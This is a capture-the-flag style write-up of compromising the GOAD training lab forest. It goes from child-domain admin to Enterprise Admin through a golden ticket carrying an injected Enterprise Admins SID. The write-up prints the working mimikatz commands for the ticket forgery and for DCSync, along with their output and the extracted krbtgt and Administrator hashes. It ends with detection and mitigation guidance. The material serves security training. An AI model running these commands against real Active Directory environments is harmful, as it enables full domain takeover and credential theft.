# GOAD Lab: From Domain Admin to Forest Dominance via ExtraSIDs Golden Ticket

**Target:** SEVENKINGDOMS.LOCAL Forest (Game of Active Directory Lab)
**Date:** 2025-12-17
**Result:** Enterprise Admin Achieved via Child-to-Parent Trust Attack

---

## Executive Summary

Starting from Domain Admin privileges in the NORTH child domain, I achieved full forest compromise of the SEVENKINGDOMS forest using a Golden Ticket with ExtraSIDs attack. By forging a Kerberos ticket with the NORTH domain's krbtgt hash and injecting the Enterprise Admins SID from the parent domain, I gained administrative access to the forest root domain controller and extracted all forest credentials.

---

## Attack Path Overview

```
+-------------------------------------------------------------------------+
|                         ATTACK PATH DIAGRAM                              |
+-------------------------------------------------------------------------+
|                                                                          |
|  [Starting Point - Domain Admin in Child Domain]                        |
|       |                                                                  |
|       v                                                                  |
|  NORTH.SEVENKINGDOMS.LOCAL - Domain Admin Access                        |
|  (krbtgt hash: e3e8bc543cc3da2285e6a0a4a2934d08)                        |
|       |                                                                  |
|       v Domain Trust Enumeration                                        |
|  +------------------------------------+                                 |
|  | Forest Root: SEVENKINGDOMS.LOCAL   |                                 |
|  | Child Domain: NORTH (current)      |                                 |
|  | Trust Type: Within Forest          |                                 |
|  +------------------------------------+                                 |
|       |                                                                  |
|       v Domain SID Enumeration                                          |
|  +------------------------------------+                                 |
|  | NORTH SID: S-1-5-21-2825620776-    |                                 |
|  |   1928720347-1758113318            |                                 |
|  | SEVENKINGDOMS SID: S-1-5-21-       |                                 |
|  |   320294251-1534116053-1819042690  |                                 |
|  +------------------------------------+                                 |
|       |                                                                  |
|       v Golden Ticket with ExtraSIDs                                    |
|  +------------------------------------+                                 |
|  | User: Administrator                |                                 |
|  | Domain: north.sevenkingdoms.local  |                                 |
|  | krbtgt: NORTH domain krbtgt hash   |                                 |
|  | ExtraSIDs: Enterprise Admins       |                                 |
|  |   (S-1-5-21-...-519)               |                                 |
|  +------------------------------------+                                 |
|       |                                                                  |
|       v Pass-The-Ticket                                                 |
|  +------------------------------------+                                 |
|  | Access: \\kingslanding\c$          |                                 |
|  | (Forest Root Domain Controller)    |                                 |
|  +------------------------------------+                                 |
|       |                                                                  |
|       v DCSync Forest Root                                              |
|  +------------------------------------+                                 |
|  | SEVENKINGDOMS\Administrator hash   |                                 |
|  | SEVENKINGDOMS\krbtgt hash          |                                 |
|  | ALL FOREST CREDENTIALS             |                                 |
|  +------------------------------------+                                 |
|       |                                                                  |
|       v                                                                  |
|  [FOREST DOMINANCE ACHIEVED]                                            |
|                                                                          |
+-------------------------------------------------------------------------+
```

---

## Prerequisites

Before this attack, I had already achieved:
- **Domain Admin** access in NORTH.SEVENKINGDOMS.LOCAL
- **DCSync** privileges allowing extraction of the NORTH krbtgt hash
- Full credential dump of the NORTH domain

Key material from previous phase:
| Item | Value |
|------|-------|
| NORTH krbtgt NTLM | `e3e8bc543cc3da2285e6a0a4a2934d08` |
| NORTH krbtgt AES256 | `d9b58f689ccfc37f09b843feebd7812865f9bdc9769048050e2c3f3292951e30` |
| NORTH Domain SID | `S-1-5-21-2825620776-1928720347-1758113318` |

---

## Phase 1: Forest Trust Enumeration

### Understanding the Trust Relationship

From our foothold on CASTELBLACK, enumerated domain trusts:

```cmd
C:\> nltest /domain_trusts

List of domain trusts:
    0: SEVENKINGDOMS sevenkingdoms.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: NORTH north.sevenkingdoms.local (NT 5) (Forest: 0) (Primary Domain) (Native)
```

**Key Findings:**
- NORTH is a **child domain** of the SEVENKINGDOMS forest
- SEVENKINGDOMS is the **Forest Tree Root**
- Trust is **bidirectional** and **within forest** (transitive)

### Identifying Forest Domain Controllers

```cmd
C:\> nltest /dclist:sevenkingdoms.local

Get list of DCs in domain 'sevenkingdoms.local' from '\\kingslanding.sevenkingdoms.local'.
    kingslanding.sevenkingdoms.local [PDC]  [DS] Site: Default-First-Site-Name
```

**Target:** `kingslanding.sevenkingdoms.local` (10.50.0.10)

---

## Phase 2: Domain SID Collection

### Getting the Parent Domain SID

To forge a ticket with Enterprise Admins privileges, I needed the SEVENKINGDOMS domain SID:

```powershell
# Translate SEVENKINGDOMS\Administrator to get the domain SID
$sid = New-Object System.Security.Principal.NTAccount('SEVENKINGDOMS','Administrator')
$sid.Translate([System.Security.Principal.SecurityIdentifier]).Value

# Result: S-1-5-21-320294251-1534116053-1819042690-500
# Domain SID: S-1-5-21-320294251-1534116053-1819042690
```

### SID Summary

| Domain | Domain SID | Notes |
|--------|------------|-------|
| NORTH | `S-1-5-21-2825620776-1928720347-1758113318` | Child domain (compromised) |
| SEVENKINGDOMS | `S-1-5-21-320294251-1534116053-1819042690` | Forest root (target) |

### Critical SIDs for Attack

| Group | SID | Purpose |
|-------|-----|---------|
| Enterprise Admins | `S-1-5-21-320294251-1534116053-1819042690-519` | Forest-wide admin privileges |
| Domain Admins (Forest) | `S-1-5-21-320294251-1534116053-1819042690-512` | Forest root domain admin |

---

## Phase 3: Golden Ticket with ExtraSIDs Attack

### The Attack Explained

In Active Directory forests, the **SID Filtering** mechanism is disabled between domains in the same forest. This allows us to:

1. Create a Golden Ticket for the **child domain** (NORTH)
2. Inject **extra SIDs** in the ticket's PAC (Privileged Attribute Certificate)
3. Include the **Enterprise Admins SID** from the parent domain
4. The forest root DC will honor these SIDs, granting us Enterprise Admin access

This is known as the **SID History Injection** or **ExtraSIDs** attack.

### Execution with Mimikatz

Using the Meterpreter Kiwi extension:

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'
  '#####'

meterpreter > kiwi_cmd "kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-2825620776-1928720347-1758113318 /krbtgt:e3e8bc543cc3da2285e6a0a4a2934d08 /sids:S-1-5-21-320294251-1534116053-1819042690-519 /ptt"
```

**Output:**
```
User      : Administrator
Domain    : north.sevenkingdoms.local (NORTH)
SID       : S-1-5-21-2825620776-1928720347-1758113318
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-320294251-1534116053-1819042690-519 ;
ServiceKey: e3e8bc543cc3da2285e6a0a4a2934d08 - rc4_hmac_nt
Lifetime  : 12/17/2025 7:06:59 AM ; 12/15/2035 7:06:59 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ north.sevenkingdoms.local' successfully submitted
```

### Parameter Breakdown

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `/user` | Administrator | User to impersonate |
| `/domain` | north.sevenkingdoms.local | Child domain name |
| `/sid` | S-1-5-21-2825620776-1928720347-1758113318 | Child domain SID |
| `/krbtgt` | e3e8bc543cc3da2285e6a0a4a2934d08 | Child domain krbtgt hash |
| `/sids` | S-1-5-21-320294251-1534116053-1819042690-519 | Enterprise Admins SID |
| `/ptt` | - | Pass-The-Ticket (inject into session) |

---

## Phase 4: Accessing the Forest Root DC

### Verifying Enterprise Admin Access

With the forged ticket injected, I tested access to the forest root DC:

```cmd
C:\> dir \\kingslanding.sevenkingdoms.local\c$

 Volume in drive \\kingslanding.sevenkingdoms.local\c$ is Windows 2019
 Volume Serial Number is BA49-CE42

 Directory of \\kingslanding.sevenkingdoms.local\c$

12/12/2025  01:06 AM    <DIR>          inetpub
05/11/2021  08:56 PM    <DIR>          PerfLogs
12/12/2025  01:44 AM    <DIR>          Program Files
05/11/2021  08:40 PM    <DIR>          Program Files (x86)
12/12/2025  01:44 AM    <DIR>          sysmon
12/12/2025  12:11 AM    <DIR>          tmp
12/12/2025  01:06 AM    <DIR>          Users
12/12/2025  01:44 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  46,000,107,520 bytes free
```

**Success!** We have administrative access to the forest root domain controller.

---

## Phase 5: DCSync the Forest Root

### Extracting Forest Root Administrator

```
meterpreter > kiwi_cmd "lsadump::dcsync /domain:sevenkingdoms.local /user:SEVENKINGDOMS\\Administrator"

[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'SEVENKINGDOMS\Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-320294251-1534116053-1819042690-500

Credentials:
  Hash NTLM: c66d72021a2d4744409969a581a1705e

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANTAdministrator
    Credentials
      aes256_hmac       (4096) : bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
      aes128_hmac       (4096) : 0c72a36a70f696fbee13a25fd3412d43
      des_cbc_md5       (4096) : 7f2cd0836164e592
```

### Extracting Forest Root krbtgt

```
meterpreter > kiwi_cmd "lsadump::dcsync /domain:sevenkingdoms.local /user:SEVENKINGDOMS\\krbtgt"

[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-320294251-1534116053-1819042690-502

Credentials:
  Hash NTLM: 34093422b0136ce5f8a0caea867d4d77

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SEVENKINGDOMS.LOCALkrbtgt
    Credentials
      aes256_hmac       (4096) : d6ff7196da79188954c60240d5f3931e62565d70683bd7daa90830de6e32c309
      aes128_hmac       (4096) : 7bcb6cf3c6a65b7bd6a6cadd4416600d
      des_cbc_md5       (4096) : 34cb68d594fdda49
```

---

## Extracted Credentials Summary

### Forest Root Domain (SEVENKINGDOMS.LOCAL)

**Critical Accounts:**
| Account | NTLM Hash | AES256 Key |
|---------|-----------|------------|
| Administrator | `c66d72021a2d4744409969a581a1705e` | `bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827` |
| krbtgt | `34093422b0136ce5f8a0caea867d4d77` | `d6ff7196da79188954c60240d5f3931e62565d70683bd7daa90830de6e32c309` |

### Child Domain (NORTH.SEVENKINGDOMS.LOCAL)

**Critical Accounts:**
| Account | NTLM Hash | AES256 Key |
|---------|-----------|------------|
| Administrator | `dbd13e1c4e338284ac4e9874f7de6ef4` | `e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972` |
| krbtgt | `e3e8bc543cc3da2285e6a0a4a2934d08` | `d9b58f689ccfc37f09b843feebd7812865f9bdc9769048050e2c3f3292951e30` |

### Domain SIDs

| Domain | SID |
|--------|-----|
| NORTH.SEVENKINGDOMS.LOCAL | `S-1-5-21-2825620776-1928720347-1758113318` |
| SEVENKINGDOMS.LOCAL | `S-1-5-21-320294251-1534116053-1819042690` |

---

## The Complete Attack Chain

```
User (jon.snow)
      |
      | Credential Discovery (NETLOGON scripts)
      v
Local Admin (jeor.mormont)
      |
      | PSExec to CASTELBLACK
      v
NT AUTHORITY\SYSTEM
      |
      | Credential Dump + Kerberoasting
      v
Constrained Delegation (jon.snow -> CIFS/winterfell)
      |
      | S4U2Proxy Attack
      v
Domain Admin (NORTH)
      |
      | DCSync -> krbtgt hash
      v
Golden Ticket with ExtraSIDs
      |
      | Inject Enterprise Admins SID
      v
Enterprise Admin (SEVENKINGDOMS Forest)
      |
      | DCSync Forest Root
      v
FOREST DOMINANCE - All credentials extracted
```

---

## Why This Attack Works

### Forest Trust Architecture

Within an Active Directory forest:
1. All domains share a common **Global Catalog**
2. Trust between parent/child domains is **transitive** and **bidirectional**
3. **SID Filtering** is disabled within the same forest
4. The **Enterprise Admins** group (from forest root) has admin rights across all domains

### The Vulnerability

When a child domain's krbtgt is compromised, an attacker can:
1. Forge any ticket for the child domain
2. Include extra SIDs in the PAC
3. The parent domain **trusts** these SIDs because:
   - The ticket is validly signed by the child's krbtgt
   - SID filtering is disabled within forest

This is **by design** - Microsoft considers child domain compromise equivalent to forest compromise.

---

## Detection Opportunities

### Event IDs to Monitor

| Event ID | Description | Indicator |
|----------|-------------|-----------|
| 4769 | Kerberos Service Ticket | Unusual service requests |
| 4624 | Logon | Enterprise Admin from child domain |
| 4672 | Special Privileges | Unexpected privileged logons |
| 4662 | Directory Service Access | DCSync attempts |

### Anomalies to Alert On

1. **TGS requests with SID history** - Tickets containing SIDs from other domains
2. **Enterprise Admin logons** - From workstations in child domains
3. **DCSync from non-DC** - Replication requests from unexpected sources
4. **Access to forest root C$** - From child domain computers

### Microsoft ATA/Defender for Identity

- **Golden Ticket Detection** - Ticket lifetime anomalies
- **Skeleton Key Detection** - Suspicious LSASS activity
- **DCSync Detection** - Unexpected replication
- **SID History Injection** - Unusual SID patterns

---

## Mitigations

### 1. SID Filtering (Quarantine)

For **external trusts**, enable SID filtering:
```powershell
netdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes
```

**Note:** This cannot be enabled for intra-forest trusts without breaking functionality.

### 2. Selective Authentication

For external trusts, use selective authentication to limit which users can authenticate:
```powershell
netdom trust <TrustingDomain> /domain:<TrustedDomain> /SelectiveAuth:yes
```

### 3. Protected Users Group

Add privileged accounts to Protected Users:
- Prevents NTLM authentication
- Forces Kerberos with AES
- Disables delegation
- Reduces ticket lifetime

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
```

### 4. Credential Guard

Enable Windows Defender Credential Guard:
- Isolates LSASS in virtualization-based security
- Prevents credential dumping

### 5. Tiered Administration Model

| Tier | Assets | Credentials |
|------|--------|-------------|
| Tier 0 | Domain Controllers, AD | Tier 0 admin accounts |
| Tier 1 | Servers | Tier 1 admin accounts |
| Tier 2 | Workstations | Tier 2 admin accounts |

**Key principle:** Higher tier credentials never touch lower tier systems.

### 6. Regular krbtgt Rotation

Rotate the krbtgt password twice (to invalidate all existing tickets):
```powershell
# First rotation
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPassword1" -AsPlainText -Force)

# Wait for replication, then second rotation
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPassword2" -AsPlainText -Force)
```

### 7. Monitor for DCSync

Alert on Event ID 4662 with:
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)
- From non-domain controller sources

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Credential Access | DCSync | T1003.006 |
| Credential Access | Golden Ticket | T1558.001 |
| Privilege Escalation | SID-History Injection | T1134.005 |
| Lateral Movement | Pass the Ticket | T1550.003 |
| Defense Evasion | Access Token Manipulation | T1134 |
| Discovery | Domain Trust Discovery | T1482 |

---

## Tools Used

- **Metasploit Framework** - Session management, payload delivery
- **Mimikatz/Kiwi** - Golden ticket creation, DCSync
- **PowerShell** - AD enumeration, SID translation
- **nltest** - Trust enumeration

---

## Lessons Learned

1. **Child domain = Forest compromise** - Once you have a child domain's krbtgt, the entire forest is compromised. Microsoft's security boundary is the **forest**, not the domain.

2. **ExtraSIDs bypasses domain boundaries** - The ability to inject arbitrary SIDs into a ticket makes domain boundaries meaningless within a forest.

3. **Defense requires forest-wide thinking** - Security teams must monitor across domain boundaries, not just within their domain.

4. **krbtgt is the keys to the kingdom** - Protecting the krbtgt hash (through proper DC security) is critical.

5. **Trust relationships are attack paths** - Every trust relationship should be viewed as a potential attack path.

---

## References

- [Mimikatz - Golden Ticket](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden)
- [Microsoft - How Domain and Forest Trusts Work](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10))
- [Harmj0y - A Guide to Attacking Domain Trusts](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d)
- [Sean Metcalf - Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)

---

*Report generated from Metasploit MCP engagement tracking - 2025-12-17*
